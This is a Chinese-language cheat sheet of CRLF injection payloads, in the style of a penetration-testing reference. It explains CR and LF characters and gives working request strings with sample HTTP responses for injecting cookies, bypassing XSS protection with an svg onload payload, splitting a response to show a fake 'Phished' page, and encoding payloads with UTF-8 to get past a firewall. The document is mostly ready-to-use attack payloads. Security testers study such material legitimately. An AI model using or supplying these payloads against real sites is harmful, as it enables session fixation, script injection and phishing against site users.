# CRLF

CRLF指回车(ASCII 13, \r)和换行(ASCII 10, \n)。 它们被用于记录行的终止，在当今流行的操作系统中处理方式不同。例如：在windows中，一行的结尾需要一个cr和lf，而在linux/unix中只需要一个lf。在http协议中，cr-lf序列总是用来终止一行。

当用户设法将crlf提交到应用程序中时，会发生crlf注入攻击。这通常是通过修改http参数或url来完成的。

## 目录

- [ 修改服务端响应包(cookie)](#修改服务端响应包-cookie)
- [修改服务端响应包(xss绕过)](#修改服务端响应包-xss绕过)
- [修改服务端响应包(HTML注入)](#修改服务端响应包-HTML注入)
- [绕过防火墙](#绕过防火墙)
- [参考](#参考)


## 修改服务端响应包-cookie

请求

```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

HTTP 响应

```·
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```

## 修改服务端响应包-xss绕过

请求

```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

HTTP 响应

```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## 修改服务端响应包-HTML注入

请求

```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

HTTP 响应

```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

## 绕过防火墙

使用 UTF-8 编码

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

Remainder:

* %E5%98%8A = %0A = \u560a
* %E5%98%8D = %0D = \u560d
* %E5%98%BE = %3E = \u563e (>)
* %E5%98%BC = %3C = \u563c (<)

## 参考

* https://www.owasp.org/index.php/CRLF_Injection
* https://vulners.com/hackerone/H1:192749
